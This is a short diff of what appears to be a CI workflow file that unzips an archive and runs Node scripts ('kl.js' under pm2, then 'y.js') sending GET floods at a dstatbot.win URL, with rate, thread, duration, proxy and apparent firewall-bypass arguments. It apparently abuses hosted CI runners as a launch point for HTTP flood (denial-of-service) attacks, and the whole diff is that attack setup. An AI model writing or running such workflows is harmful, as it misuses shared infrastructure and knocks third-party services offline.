@@ -48,7 +48,7 @@ jobs:
           
           unzip Fc-main.zip
           cd Fc-main
-          pm2 start kl.js -i max --interpreter node -- GET https://c1.dstatbot.win/iQVayrB2 700 4 120 proxy.txt
+          node y.js GET https://c1.dstatbot.win/v0KzLqtO 700 4 90 --full --bfw --debug 
           
            
           
